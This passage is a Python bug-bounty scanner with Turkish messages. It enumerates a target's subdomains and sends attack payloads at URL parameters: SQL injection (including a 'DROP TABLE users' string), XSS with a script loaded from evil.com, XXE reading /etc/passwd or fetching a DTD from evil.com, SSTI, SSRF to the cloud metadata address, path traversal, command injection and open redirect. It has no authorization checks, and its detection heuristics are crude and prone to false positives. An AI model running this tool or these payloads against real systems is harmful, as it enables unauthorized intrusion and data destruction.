#!/usr/bin/env python3
import argparse
import dns.resolver
import dns.zone
import httpx
import requests
from bs4 import BeautifulSoup, XMLParsedAsHTMLWarning
import aiohttp
import asyncio
import subprocess
import sys
import ssl
import socket
import json
import csv
import yaml
import xml.etree.ElementTree as ET
from urllib.parse import urlparse, urljoin, parse_qs, quote
from datetime import datetime, timedelta
import random
import logging
import signal
import tempfile
import os
import re
import time
from typing import Dict, List, Set, Tuple, Optional
from colorama import init, Fore, Style
from tabulate import tabulate
import hashlib
import jwt
from cvss import CVSS3
import string
import secrets
import urllib3
import warnings
from urllib3.util.retry import Retry
from requests.adapters import HTTPAdapter

# Uyarıları bastırma
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
warnings.filterwarnings("ignore", category=XMLParsedAsHTMLWarning)

# Logging yapılandırması
logging.basicConfig(filename='pro_bugbounty_scan.log', level=logging.INFO,
                    format='%(asctime)s - %(levelname)s - %(message)s')
init()

# Varsayılan kelime listeleri
DEFAULT_SUB_WORDLIST = "/usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt"
DEFAULT_DIR_WORDLIST = "/usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt"
DEFAULT_CONFIG = "config.yaml"

# Kısa subdomain kelime listesi
SHORT_SUB_WORDLIST = [
    'www', 'mail', 'ftp', 'api', 'dev', 'test', 'staging', 'admin', 'login', 'app',
    'portal', 'dashboard', 'web', 'mobile', 'beta', 'vpn', 'smtp', 'pop3', 'imap',
    'secure', 'crm', 'erp', 'blog', 'shop', 'store', 'auth', 'sso', 'cms', 'panel'
]

# Gelişmiş payload listeleri
SQLI_PAYLOADS = [
    "1'", "1' OR '1'='1", "1' UNION SELECT NULL--", "1' UNION SELECT 1,@@version--",
    "1'; DROP TABLE users--", "1' AND SLEEP(5)--", "' OR '1'='1' /*", "1' AND 1=CONVERT(int,@@version)--"
]
XSS_PAYLOADS = [
    "<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
    "javascript:alert(1)", "<svg onload=alert(1)>", "\" onmouseover=alert(1)",
    "<iframe src=javascript:alert(1)>", "<details open ontoggle=alert(1)>",
    "<script src=//evil.com/x.js></script>"
]
SSTI_PAYLOADS = [
    "{{7*7}}", "${7*7}", "<%= 7*7 %>", "{{ '7'*7 }}", "#{7*7}",
    "{% debug %}", "{{config.items()}}", "{{ ''.__class__.__mro__[1].__subclasses__() }}"
]
XXE_PAYLOADS = [
    '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
    '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "http://evil.com/malicious.dtd">]><root>&xxe;</root>'
]
OPEN_REDIRECT_PAYLOADS = [
    "http://evil.com", "//evil.com", "https://evil.com", "javascript:alert(1)",
    "data:text/html,<script>alert(1)</script>", "/\\evil.com", "http://attacker.com"
]
HPP_PAYLOADS = [
    "param1=value1¶m1=value2", "param1[]=value1¶m1[]=value2"
]

class Vulnerability:
    def __init__(self, type: str, url: str, severity: str, description: str, 
                 evidence: str = "", cvss_score: float = 0.0, cvss_vector: str = "", affected_param: str = ""):
        self.type = type
        self.url = url
        self.severity = severity
        self.description = description
        self.evidence = evidence
        self.cvss_score = cvss_score
        self.cvss_vector = cvss_vector
        self.affected_param = affected_param
        self.timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        self.hash = self._generate_hash()

    def _generate_hash(self) -> str:
        return hashlib.md5(f"{self.type}{self.url}{self.description}{self.affected_param}".encode()).hexdigest()

class SubdomainEnumerator:
    def __init__(self, target: str, sub_wordlist: List[str], full_brute: bool = False,
                 dns_servers: str = None, config: Dict = None):
        self.target = target
        self.sub_wordlist = sub_wordlist if full_brute else SHORT_SUB_WORDLIST
        self.subdomains: Set[str] = set()
        self.source_map: Dict[str, str] = {}
        self.dns_servers = dns_servers.split(',') if dns_servers else config.get('dns_servers', ['8.8.8.8', '1.1.1.1'])
        self.config = config
        self.semaphore = asyncio.Semaphore(self.config.get('max_concurrent_tasks', 50))
        self.domain_regex = re.compile(r'^[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+$', re.IGNORECASE)

    def is_valid_subdomain(self, subdomain: str) -> bool:
        """Subdomainin geçerli bir domain formatında olup olmadığını kontrol eder."""
        if '@' in subdomain or not self.domain_regex.match(subdomain):
            return False
        return subdomain.endswith(self.target)

    async def resolve_subdomain(self, subdomain: str, record_type: str = 'A') -> Optional[Tuple[str, str, List[str]]]:
        async with self.semaphore:
            resolver = dns.resolver.Resolver()
            resolver.nameservers = self.dns_servers
            resolver.timeout = self.config.get('dns_timeout', 2)
            resolver.lifetime = self.config.get('dns_timeout', 2)
            try:
                answers = await asyncio.get_event_loop().run_in_executor(
                    None, lambda: resolver.resolve(subdomain, record_type))
                return subdomain, record_type, [str(rdata) for rdata in answers]
            except dns.exception.DNSException as e:
                logging.info(f"DNS çözünürlüğü hatası ({subdomain}, {record_type}): {e}")
                return None

    async def check_wildcard(self) -> Tuple[bool, List[str]]:
        random_sub = f"random{random.randint(1000, 9999)}.{self.target}"
        resolver = dns.resolver.Resolver()
        resolver.nameservers = self.dns_servers
        try:
            answers = await asyncio.get_event_loop().run_in_executor(
                None, lambda: resolver.resolve(random_sub, 'A'))
            wildcard_ips = [str(rdata) for rdata in answers]
            print(f"{Fore.YELLOW}[-] Uyarı: {self.target} wildcard DNS kaydı kullanıyor (IPs: {wildcard_ips}){Style.RESET_ALL}")
            return True, wildcard_ips
        except Exception:
            return False, []

    async def try_zone_transfer(self):
        print(f"{Fore.BLUE}[*] Zone Transfer denemesi: {self.target}{Style.RESET_ALL}")
        resolver = dns.resolver.Resolver()
        resolver.nameservers = self.dns_servers
        try:
            ns_records = await asyncio.get_event_loop().run_in_executor(
                None, lambda: resolver.resolve(self.target, 'NS'))
            for ns in ns_records:
                ns_name = str(ns)
                try:
                    zone = await asyncio.get_event_loop().run_in_executor(
                        None, lambda: dns.zone.from_xfr(dns.query.xfr(ns_name, self.target)))
                    for name in zone.nodes.keys():
                        subdomain = f"{name}.{self.target}"
                        if self.is_valid_subdomain(subdomain):
                            self.subdomains.add(subdomain)
                            self.source_map[subdomain] = "Zone Transfer"
                            print(f"{Fore.GREEN}[+] Zone Transfer ile bulundu: {subdomain}{Style.RESET_ALL}")
                except Exception as e:
                    logging.info(f"Zone Transfer hatası ({ns_name}): {e}")
        except Exception as e:
            logging.info(f"NS kaydı alınamadı: {e}")

    async def get_ssl_subdomains(self, domain: str):
        print(f"{Fore.BLUE}[*] SSL sertifikalarından subdomain tarama: {domain}{Style.RESET_ALL}")
        try:
            async with aiohttp.ClientSession() as session:
                ctx = ssl._create_unverified_context()
                conn = aiohttp.TCPConnector(ssl=ctx)
                async with session.get(f"https://{domain}", timeout=2, connector=conn) as response:
                    cert = response.connection.transport.get_extra_info('peercert')
                    if cert:
                        for san in cert.get('subjectAltName', []):
                            if san[0] == 'DNS' and not san[1].startswith('*') and self.is_valid_subdomain(san[1]):
                                self.subdomains.add(san[1])
                                self.source_map[san[1]] = "SSL Sertifikası"
                                print(f"{Fore.GREEN}[+] SSL sertifikasından bulundu: {san[1]}{Style.RESET_ALL}")
        except Exception as e:
            logging.info(f"SSL tarama hatası ({domain}): {e}")

    async def check_txt_records(self):
        print(f"{Fore.BLUE}[*] TXT kayıtları taranıyor: {self.target}{Style.RESET_ALL}")
        resolver = dns.resolver.Resolver()
        resolver.nameservers = self.dns_servers
        try:
            answers = await asyncio.get_event_loop().run_in_executor(
                None, lambda: resolver.resolve(self.target, 'TXT'))
            for rdata in answers:
                txt = str(rdata).strip('"')
                print(f"{Fore.CYAN}[+] TXT kaydı bulundu: {txt}{Style.RESET_ALL}")
                if 'include:' in txt:
                    for part in txt.split():
                        if part.startswith('include:'):
                            domain = part.split(':', 1)[1]
                            if self.is_valid_subdomain(domain):
                                self.subdomains.add(domain)
                                self.source_map[domain] = "TXT Kaydı"
                                print(f"{Fore.GREEN}[+] TXT kaydından bulundu: {domain}{Style.RESET_ALL}")
        except Exception as e:
            logging.info(f"TXT kaydı tarama hatası: {e}")

    async def crt_sh_subdomains(self, retries: int = 3, backoff: int = 2):
        print(f"{Fore.BLUE}[*] crt.sh üzerinden subdomain tarama: {self.target}{Style.RESET_ALL}")
        seen_subdomains = set()
        for attempt in range(retries):
            try:
                async with httpx.AsyncClient(timeout=10) as client:
                    response = await client.get(f"https://crt.sh/?q=%.{self.target}&output=json")
                    if response.status_code == 200:
                        data = response.json()
                        current_year = datetime.now().year
                        for entry in data:
                            subdomains = entry.get('name_value', '').strip().split('\n')
                            cert_date = entry.get('not_after', '').split('T')[0]
                            cert_year = int(cert_date.split('-')[0]) if cert_date else 0
                            if cert_year >= current_year - 2:
                                for subdomain in subdomains:
                                    subdomain = subdomain.strip()
                                    if self.is_valid_subdomain(subdomain) and subdomain not in seen_subdomains:
                                        seen_subdomains.add(subdomain)
                                        self.subdomains.add(subdomain)
                                        self.source_map[subdomain] = "crt.sh"
                                        print(f"{Fore.GREEN}[+] crt.sh ile bulundu: {subdomain} (Sertifika: {cert_date}){Style.RESET_ALL}")
                        return
            except Exception as e:
                logging.info(f"crt.sh tarama hatası (deneme {attempt + 1}/{retries}): {e}")
                if attempt < retries - 1:
                    await asyncio.sleep(backoff * (2 ** attempt))

    async def wayback_subdomains(self):
        print(f"{Fore.BLUE}[*] Wayback Machine üzerinden subdomain tarama: {self.target}{Style.RESET_ALL}")
        try:
            async with httpx.AsyncClient(timeout=10) as client:
                response = await client.get(f"http://web.archive.org/cdx/search/cdx?url=*.{self.target}&output=json&fl=original")
                if response.status_code == 200:
                    data = response.json()
                    for entry in data[1:]:
                        url = entry[0]
                        parsed = urlparse(url)
                        subdomain = parsed.netloc
                        if self.is_valid_subdomain(subdomain) and subdomain not in self.subdomains:
                            self.subdomains.add(subdomain)
                            self.source_map[subdomain] = "Wayback Machine"
                            print(f"{Fore.GREEN}[+] Wayback Machine ile bulundu: {subdomain}{Style.RESET_ALL}")
        except Exception as e:
            logging.info(f"Wayback Machine tarama hatası: {e}")

    async def run_subfinder(self):
        print(f"{Fore.BLUE}[*] Subfinder ile subdomain tarama: {self.target}{Style.RESET_ALL}")
        try:
            cmd = ["subfinder", "-d", self.target, "-silent", "-all"]
            result = await asyncio.get_event_loop().run_in_executor(
                None, lambda: subprocess.run(cmd, capture_output=True, text=True, timeout=300))
            found_subdomains = result.stdout.splitlines()
            for sub in found_subdomains:
                sub = sub.strip()
                if self.is_valid_subdomain(sub) and sub not in self.subdomains:
                    self.subdomains.add(sub)
                    self.source_map[sub] = "subfinder"
                    print(f"{Fore.GREEN}[+] subfinder ile bulundu: {sub}{Style.RESET_ALL}")
        except subprocess.TimeoutExpired:
            logging.info("subfinder taraması zaman aşımına uğradı")
        except FileNotFoundError:
            print(f"{Fore.RED}[-] subfinder bulunamadı. Lütfen kurulu olduğundan emin olun.{Style.RESET_ALL}")
            logging.info("subfinder bulunamadı")
        except Exception as e:
            logging.info(f"subfinder tarama hatası: {e}")

    async def run_assetfinder(self):
        print(f"{Fore.BLUE}[*] Assetfinder ile subdomain tarama: {self.target}{Style.RESET_ALL}")
        try:
            cmd = ["assetfinder", "--subs-only", self.target]
            result = await asyncio.get_event_loop().run_in_executor(
                None, lambda: subprocess.run(cmd, capture_output=True, text=True, timeout=300))
            found_subdomains = result.stdout.splitlines()
            for sub in found_subdomains:
                sub = sub.strip()
                if self.is_valid_subdomain(sub) and sub not in self.subdomains:
                    self.subdomains.add(sub)
                    self.source_map[sub] = "assetfinder"
                    print(f"{Fore.GREEN}[+] assetfinder ile bulundu: {sub}{Style.RESET_ALL}")
        except subprocess.TimeoutExpired:
            logging.info("assetfinder taraması zaman aşımına uğradı")
        except FileNotFoundError:
            print(f"{Fore.RED}[-] assetfinder bulunamadı. Lütfen kurulu olduğundan emin olun.{Style.RESET_ALL}")
            logging.info("assetfinder bulunamadı")
        except Exception as e:
            logging.info(f"assetfinder tarama hatası: {e}")

    async def run_httpx_toolkit(self, subdomains: List[str]) -> List[Dict]:
        print(f"{Fore.BLUE}[*] httpx-toolkit ile subdomain doğrulama: {self.target}{Style.RESET_ALL}")
        live_subdomains = []
        try:
            with tempfile.NamedTemporaryFile(mode='w', delete=False) as temp_file:
                for sub in subdomains:
                    if self.is_valid_subdomain(sub):
                        temp_file.write(f"{sub}\n")
                temp_file_path = temp_file.name

            cmd = ["httpx-toolkit", "-l", temp_file_path, "-sc", "-silent", "-t", "100", "-timeout", "5"]
            result = await asyncio.get_event_loop().run_in_executor(
                None, lambda: subprocess.run(cmd, capture_output=True, text=True, timeout=300))
            output = result.stdout.splitlines()
            for line in output:
                parts = line.strip().split()
                if parts:
                    url = parts[0]
                    status = int(parts[1].strip('[]')) if len(parts) > 1 else 200
                    if status not in [200, 301, 302]:
                        continue
                    subdomain = url.replace("https://", "").replace("http://", "")
                    if self.is_valid_subdomain(subdomain):
                        live_subdomains.append({
                            "subdomain": subdomain,
                            "status": status,
                            "tech": ["Bilinmiyor"],
                            "category": self.categorize_subdomain(subdomain),
                            "source": "httpx-toolkit",
                            "redirect_url": None,
                            "other_protocols": []
                        })
                        print(f"{Fore.GREEN}[+] httpx-toolkit ile bulundu: {subdomain} (Status: {status}){Style.RESET_ALL}")
            os.unlink(temp_file_path)
        except subprocess.TimeoutExpired:
            logging.info("httpx-toolkit taraması zaman aşımına uğradı")
        except FileNotFoundError:
            print(f"{Fore.RED}[-] httpx-toolkit bulunamadı. Lütfen kurulu olduğundan emin olun.{Style.RESET_ALL}")
            logging.info("httpx-toolkit bulunamadı")
        except Exception as e:
            logging.info(f"httpx-toolkit tarama hatası: {e}")
        return live_subdomains

    async def enumerate(self, tools: List[str], full_brute: bool = False, 
                        brute_threads: int = 100) -> Tuple[Set[str], Dict[str, str]]:
        self.subdomains.clear()
        self.source_map.clear()
        try:
            is_wildcard, wildcard_ips = await self.check_wildcard()
            tasks = []
            if 'zone' in tools:
                tasks.append(self.try_zone_transfer())
            if 'ssl' in tools:
                tasks.append(self.get_ssl_subdomains(self.target))
            if 'txt' in tools:
                tasks.append(self.check_txt_records())
            if 'crt.sh' in tools:
                tasks.append(self.crt_sh_subdomains())
            if 'wayback' in tools:
                tasks.append(self.wayback_subdomains())
            if 'subfinder' in tools:
                tasks.append(self.run_subfinder())
            if 'assetfinder' in tools:
                tasks.append(self.run_assetfinder())
            if 'brute' in tools:
                tasks.append(self.dns_brute_force(is_wildcard, wildcard_ips, brute_threads))
            await asyncio.gather(*tasks, return_exceptions=True)
        except Exception as e:
            logging.info(f"Enumerasyon hatası: {e}")
        return self.subdomains, self.source_map

    async def dns_brute_force(self, is_wildcard: bool, wildcard_ips: List[str], brute_threads: int = 100):
        print(f"{Fore.BLUE}[*] DNS brute force tarama: {self.target} (Paralel sorgu: {brute_threads}){Style.RESET_ALL}")
        record_types = ['A', 'CNAME', 'MX', 'TXT']
        tasks = []
        batch_size = brute_threads
        for i in range(0, len(self.sub_wordlist), batch_size):
            batch = self.sub_wordlist[i:i + batch_size]
            for sub in batch:
                subdomain = f"{sub}.{self.target}"
                if not self.is_valid_subdomain(subdomain):
                    continue
                for rtype in record_types:
                    tasks.append(self.resolve_subdomain(subdomain, rtype))
            results = await asyncio.gather(*tasks, return_exceptions=True)
            tasks = []
            for result in results:
                if result and not isinstance(result, Exception):
                    subdomain, rtype, rdata = result
                    if is_wildcard and rtype == 'A' and rdata in wildcard_ips:
                        continue
                    print(f"{Fore.GREEN}[+] Bulundu: {subdomain} ({rtype}: {', '.join(rdata)}){Style.RESET_ALL}")
                    self.subdomains.add(subdomain)
                    self.source_map[subdomain] = f"DNS ({rtype})"
            await asyncio.sleep(self.config.get('dns_delay', 0.05))

class BugBountyScanner:
    @staticmethod
    def load_config(config_file: str) -> Dict:
        try:
            with open(config_file, 'r') as f:
                return yaml.safe_load(f) or {}
        except Exception as e:
            logging.info(f"Yapılandırma dosyası yükleme hatası: {e}")
            return {
                'dns_servers': ['8.8.8.8', '1.1.1.1', '9.9.9.9'],
                'dns_timeout': 2,
                'dns_delay': 0.05,
                'http_timeout': 10,  # Zaman aşımı artırıldı
                'rate_limit_delay': 0.2,
                'max_retries': 3,
                'whitelist_status': [200, 301, 302],
                'blacklist_domains': ['*.cloudflare.com', '*.akamai.net', '*.fastly.net'],
                'max_concurrent_tasks': 50
            }

    def __init__(self, target: str, wordlist: List[str] = None, sub_wordlist: List[str] = None,
                 full_brute: bool = False, dns_servers: str = None, config: Dict = None):
        parsed = urlparse(target)
        self.target = parsed.netloc if parsed.netloc else target.rstrip('/')
        self.scheme = parsed.scheme if parsed.scheme else 'https'
        self.config = config or {}
        self.wordlist = wordlist if wordlist else self.load_default_dir_wordlist()
        self.sub_wordlist = sub_wordlist if sub_wordlist else self.load_default_sub_wordlist()
        self.vulnerabilities: List[Vulnerability] = []
        self.subdomains: List[str] = []
        self.live_subdomains_info: List[Dict] = []
        self.dead_subdomains: List[Tuple[str, str]] = []
        self.endpoints: Dict[str, Dict] = {}
        self.live_urls: List[Dict] = []
        self.subdomain_enumerator = SubdomainEnumerator(
            self.target, self.sub_wordlist, full_brute, dns_servers, self.config)
        self.start_time = None
        self.rate_limit_delay = self.config.get('rate_limit_delay', 0.2)
        self.semaphore = asyncio.Semaphore(self.config.get('max_concurrent_tasks', 50))

    def load_default_sub_wordlist(self) -> List[str]:
        try:
            if os.path.exists(DEFAULT_SUB_WORDLIST):
                with open(DEFAULT_SUB_WORDLIST, 'r') as f:
                    return [line.strip() for line in f if line.strip()]
            return SHORT_SUB_WORDLIST
        except Exception as e:
            logging.info(f"Varsayılan subdomain kelime listesi yükleme hatası: {e}")
            return SHORT_SUB_WORDLIST

    def load_default_dir_wordlist(self) -> List[str]:
        try:
            if os.path.exists(DEFAULT_DIR_WORDLIST):
                with open(DEFAULT_DIR_WORDLIST, 'r') as f:
                    return [line.strip() for line in f if line.strip()]
            return ['index', 'admin', 'login', 'api']
        except Exception as e:
            logging.info(f"Varsayılan dizin kelime listesi yükleme hatası: {e}")
            return ['index', 'admin', 'login', 'api']

    async def check_url(self, url: str, verify_ssl: bool = False, retries: int = 3,
                        verify_subdomains: bool = False) -> Optional[Tuple[str, int, Dict, List[str], str]]:
        async with self.semaphore:
            for scheme in ['https', 'http']:
                test_url = f"{scheme}://{url.replace('https://', '').replace('http://', '')}"
                for attempt in range(retries):
                    async with httpx.AsyncClient(
                        timeout=self.config.get('http_timeout', 10),
                        verify=verify_ssl,
                        follow_redirects=True,
                        max_redirects=10,
                        limits=httpx.Limits(max_connections=200)
                    ) as client:
                        try:
                            response = await client.get(test_url)
                            status = response.status_code
                            if verify_subdomains and status not in self.config.get('whitelist_status', [200, 301, 302]):
                                self.dead_subdomains.append((test_url, f"Geçersiz durum kodu: {status}"))
                                return None
                            tech_stack = self.detect_tech(response.headers, response.text)
                            redirect_url = str(response.url) if response.history else None
                            await asyncio.sleep(self.rate_limit_delay)
                            return test_url, status, response.headers, tech_stack, redirect_url
                        except (httpx.RequestError, ssl.SSLError) as e:
                            if attempt == retries - 1:
                                self.dead_subdomains.append((test_url, f"HTTP/SSL Hatası: {str(e)}"))
                                logging.info(f"URL kontrol hatası ({test_url}): {str(e)}")
                            await asyncio.sleep(self.rate_limit_delay * (2 ** attempt))
            return None

    def detect_tech(self, headers: Dict, content: str) -> List[str]:
        tech_stack = []
        headers = {k.lower(): v for k, v in headers.items()}
        if 'server' in headers:
            tech_stack.append(f"Server: {headers['server']}")
        if 'x-powered-by' in headers:
            tech_stack.append(f"Powered-By: {headers['x-powered-by']}")
        if 'wordpress' in content.lower():
            tech_stack.append("CMS: WordPress")
        if 'drupal' in content.lower():
            tech_stack.append("CMS: Drupal")
        if 'joomla' in content.lower():
            tech_stack.append("CMS: Joomla")
        if 'graphql' in content.lower():
            tech_stack.append("API: GraphQL")
        if 'laravel' in content.lower():
            tech_stack.append("Framework: Laravel")
        return tech_stack if tech_stack else ["Bilinmiyor"]

    async def check_other_protocols(self, subdomain: str) -> List[str]:
        protocols = {'smtp': 25, 'ftp': 21, 'ssh': 22, 'smb': 445, 'rdp': 3389}
        results = []
        for proto, port in protocols.items():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((subdomain, port))
                sock.close()
                if result == 0:
                    results.append(f"{proto.upper()} açık (Port: {port})")
            except:
                pass
        return results

    def categorize_subdomain(self, subdomain: str) -> str:
        categories = {
            'mail': ['mail', 'email', 'smtp', 'imap', 'pop3'],
            'panel': ['cpanel', 'whm', 'webmail', 'admin', 'login', 'dashboard'],
            'app': ['app', 'apps', 'application', 'portal', 'lms', 'crm'],
            'media': ['media', 'img', 'image', 'video', 'webtv', 'studyo'],
            'api': ['api', 'rest', 'graphql'],
            'other': []
        }
        for category, keywords in categories.items():
            if any(keyword in subdomain.lower() for keyword in keywords):
                return category
        return 'other'

    def truncate_url(self, url: str, max_length: int = 50) -> str:
        if url and len(url) > max_length:
            return url[:max_length-3] + "..."
        return url or "-"

    def parse_parameters(self, url: str) -> Dict:
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        return {k: v for k, v in params.items()}

    async def advanced_security_scan(self, url: str, params: Dict) -> List[Vulnerability]:
        findings = []
        async with httpx.AsyncClient(
            timeout=self.config.get('http_timeout', 10),
            verify=False,
            follow_redirects=True,
            max_redirects=10
        ) as client:
            # SQL Injection
            for param in params:
                for payload in SQLI_PAYLOADS:
                    test_url = url.replace(f"{param}={params[param][0]}", f"{param}={quote(payload)}")
                    try:
                        response = await client.get(test_url)
                        if any(err in response.text.lower() for err in ["sql", "syntax", "mysql", "postgresql"]):
                            verify_url = test_url.replace(payload, f"{quote(payload)} UNION SELECT 'verify'--")
                            verify_response = await client.get(verify_url)
                            if 'verify' in verify_response.text:
                                cvss = CVSS3('CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H')
                                findings.append(Vulnerability(
                                    "SQL Injection", test_url, "Critical",
                                    "SQL enjeksiyon açığı tespit edildi",
                                    f"Payload: {payload}, Response: {response.text[:100]}",
                                    cvss.get_score(), cvss.vector, param
                                ))
                        await asyncio.sleep(self.rate_limit_delay)
                    except Exception as e:
                        logging.info(f"SQLi testi hatası ({test_url}): {e}")

            # XSS
            for param in params:
                for payload in XSS_PAYLOADS:
                    unique_id = random.randint(1000, 9999)
                    test_payload = payload.replace("alert(1)", f"alert('{unique_id}')")
                    test_url = url.replace(f"{param}={params[param][0]}", f"{param}={quote(test_payload)}")
                    try:
                        response = await client.get(test_url)
                        if test_payload in response.text:
                            verify_payload = test_payload.replace("alert", "console.log")
                            verify_url = test_url.replace(test_payload, quote(verify_payload))
                            verify_response = await client.get(verify_url)
                            if verify_payload in verify_response.text:
                                cvss = CVSS3('CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N')
                                findings.append(Vulnerability(
                                    "XSS", test_url, "High",
                                    "Reflected XSS açığı tespit edildi",
                                    f"Payload: {test_payload}",
                                    cvss.get_score(), cvss.vector, param
                                ))
                        await asyncio.sleep(self.rate_limit_delay)
                    except Exception as e:
                        logging.info(f"XSS testi hatası ({test_url}): {e}")

            # SSRF
            for param in params:
                test_url = url.replace(f"{param}={params[param][0]}", f"{param}={quote('http://169.254.169.254/latest/meta-data/')}")
                try:
                    response = await client.get(test_url)
                    if "instance-id" in response.text.lower():
                        cvss = CVSS3('CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N')
                        findings.append(Vulnerability(
                            "SSRF", test_url, "Critical",
                            "Server-Side Request Forgery açığı tespit edildi",
                            f"Response: {response.text[:100]}",
                            cvss.get_score(), cvss.vector, param
                        ))
                    await asyncio.sleep(self.rate_limit_delay)
                except Exception as e:
                    logging.info(f"SSRF testi hatası ({test_url}): {e}")

            # LFI
            for param in params:
                test_url = url.replace(f"{param}={params[param][0]}", f"{param}={quote('../../../../etc/passwd')}")
                try:
                    response = await client.get(test_url)
                    if "root:x" in response.text:
                        cvss = CVSS3('CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N')
                        findings.append(Vulnerability(
                            "LFI", test_url, "Critical",
                            "Local File Inclusion açığı tespit edildi",
                            f"Response: {response.text[:100]}",
                            cvss.get_score(), cvss.vector, param
                        ))
                    await asyncio.sleep(self.rate_limit_delay)
                except Exception as e:
                    logging.info(f"LFI testi hatası ({test_url}): {e}")

            # RCE
            for param in params:
                test_url = url.replace(f"{param}={params[param][0]}", f"{param}={quote(';id')}")
                try:
                    response = await client.get(test_url)
                    if "uid=" in response.text:
                        cvss = CVSS3('CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H')
                        findings.append(Vulnerability(
                            "RCE", test_url, "Critical",
                            "Remote Code Execution açığı tespit edildi",
                            f"Response: {response.text[:100]}",
                            cvss.get_score(), cvss.vector, param
                        ))
                    await asyncio.sleep(self.rate_limit_delay)
                except Exception as e:
                    logging.info(f"RCE testi hatası ({test_url}): {e}")

            # SSTI
            for param in params:
                for payload in SSTI_PAYLOADS:
                    test_url = url.replace(f"{param}={params[param][0]}", f"{param}={quote(payload)}")
                    try:
                        response = await client.get(test_url)
                        if "49" in response.text or "config" in response.text.lower():
                            cvss = CVSS3('CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H')
                            findings.append(Vulnerability(
                                "SSTI", test_url, "Critical",
                                "Server-Side Template Injection açığı tespit edildi",
                                f"Payload: {payload}, Response: {response.text[:100]}",
                                cvss.get_score(), cvss.vector, param
                            ))
                        await asyncio.sleep(self.rate_limit_delay)
                    except Exception as e:
                        logging.info(f"SSTI testi hatası ({test_url}): {e}")

            # XXE
            for param in params:
                for payload in XXE_PAYLOADS:
                    try:
                        headers = {'Content-Type': 'application/xml'}
                        response = await client.post(url, data=payload, headers=headers)
                        if "root:x" in response.text or "evil.com" in response.text:
                            cvss = CVSS3('CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N')
                            findings.append(Vulnerability(
                                "XXE", url, "Critical",
                                "XML External Entity açığı tespit edildi",
                                f"Payload: {payload[:100]}, Response: {response.text[:100]}",
                                cvss.get_score(), cvss.vector, param
                            ))
                        await asyncio.sleep(self.rate_limit_delay)
                    except Exception as e:
                        logging.info(f"XXE testi hatası ({url}): {e}")

            # CSRF
            try:
                response = await client.get(url)
                soup = BeautifulSoup(response.text, 'lxml')
                forms = soup.find_all('form')
                for form in forms:
                    if not form.find('input', {'name': re.compile(r'csrf|token', re.I)}):
                        cvss = CVSS3('CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N')
                        findings.append(Vulnerability(
                            "CSRF", url, "High",
                            "CSRF token eksikliği tespit edildi",
                            f"Form: {str(form)[:100]}",
                            cvss.get_score(), cvss.vector
                        ))
                await asyncio.sleep(self.rate_limit_delay)
            except Exception as e:
                logging.info(f"CSRF testi hatası ({url}): {e}")

            # IDOR
            for param in params:
                if any(p in param.lower() for p in ['id', 'user', 'account']):
                    test_url = url.replace(f"{param}={params[param][0]}", f"{param}={int(params[param][0]) + 1 if params[param][0].isdigit() else params[param][0] + '_test'}")
                    try:
                        response = await client.get(test_url)
                        if response.status_code == 200 and params[param][0] not in response.text:
                            cvss = CVSS3('CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N')
                            findings.append(Vulnerability(
                                "IDOR", test_url, "High",
                                "Insecure Direct Object Reference açığı tespit edildi",
                                f"Param: {param}, Response: {response.text[:100]}",
                                cvss.get_score(), cvss.vector, param
                            ))
                        await asyncio.sleep(self.rate_limit_delay)
                    except Exception as e:
                        logging.info(f"IDOR testi hatası ({test_url}): {e}")

            # Open Redirect
            for param in params:
                for payload in OPEN_REDIRECT_PAYLOADS:
                    test_url = url.replace(f"{param}={params[param][0]}", f"{param}={quote(payload)}")
                    try:
                        response = await client.get(test_url, follow_redirects=False)
                        if response.status_code in [301, 302] and any(p in response.headers.get('location', '') for p in ['evil.com', 'javascript:', 'data:', 'attacker.com']):
                            cvss = CVSS3('CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N')
                            findings.append(Vulnerability(
                                "Open Redirect", test_url, "Medium",
                                "Açık yönlendirme açığı tespit edildi",
                                f"Payload: {payload}, Location: {response.headers.get('location')}",
                                cvss.get_score(), cvss.vector, param
                            ))
                        await asyncio.sleep(self.rate_limit_delay)
                    except Exception as e:
                        logging.info(f"Open Redirect testi hatası ({test_url}): {e}")

            # Rate Limit Bypass
            for param in params:
                headers = {'X-Forwarded-For': f"127.0.{random.randint(0,255)}.{random.randint(0,255)}"}
                try:
                    responses = []
                    for _ in range(5):
                        response = await client.get(url, headers=headers)
                        responses.append(response.status_code)
                        await asyncio.sleep(self.rate_limit_delay)
                    if all(r == 200 for r in responses):
                        cvss = CVSS3('CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H')
                        findings.append(Vulnerability(
                            "Rate Limit Bypass", url, "High",
                            "Rate limit atlatma açığı tespit edildi",
                            f"Headers: {headers}",
                            cvss.get_score(), cvss.vector
                        ))
                except Exception as e:
                    logging.info(f"Rate Limit testi hatası ({url}): {e}")

            # OAuth Misconfiguration
            for param in params:
                if 'redirect_uri' in param.lower():
                    test_url = url.replace(f"{param}={params[param][0]}", f"{param}={quote('http://evil.com')}")
                    try:
                        response = await client.get(test_url, follow_redirects=False)
                        if response.status_code in [301, 302] and 'evil.com' in response.headers.get('location', ''):
